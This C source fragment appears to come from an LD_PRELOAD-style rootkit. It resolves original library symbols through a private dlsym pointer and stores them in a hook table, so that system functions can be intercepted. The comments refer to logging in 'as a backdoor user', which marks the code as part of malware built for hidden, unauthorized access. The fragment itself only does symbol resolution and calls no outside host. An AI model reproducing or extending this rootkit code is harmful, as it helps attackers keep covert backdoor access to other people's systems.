void get_symbol_pointer(int symbol_index, void *handle){
    char *symbol_name = all[symbol_index];
    void *fptr;

    /* if the symbol has already been resolved, there's no need to do it again */
    if(symbols[symbol_index].func != NULL || symbol_name == NULL)
        return;

    locate_dlsym();    /* resolve o_dlsym so we can get our symbol pointer */
    fptr = o_dlsym(handle, symbol_name);   /* get us our symbol pointer */

    if(fptr == NULL){
        /* i've noticed that we're failing to resolve a few symbols.
         * this had never been a problem previously, so i'm not sure
         * at all what's started causing this.
         * so for the time being, instead of exiting, just return.
         * everything still seems to be in working order. we can still
         * log into the box as regular users or as a backdoor user. */

        //printf("failed getting %s\n", symbol_name);
        //exit(0);

        return;  // kill me
    }

    symbols[symbol_index].func = fptr;
}

/* this function has a wrapper macro called hook in libdl.h.
 * naming this function & its subsequent macro 'hook' is a
 * little inaccurate. but that matters not. */
void _hook(void *handle, ...){
    int symbol_index;
    va_list va;

    va_start(va, handle);
    while((symbol_index = va_arg(va, int)) > -1){
        /* break if symbol_index is more than the amount of functions we've hooked */
        if(symbol_index > ALL_SIZE) break;
        /* resolve the specified symbol from symbol_index */
        get_symbol_pointer(symbol_index, handle);
    }
    va_end(va);
}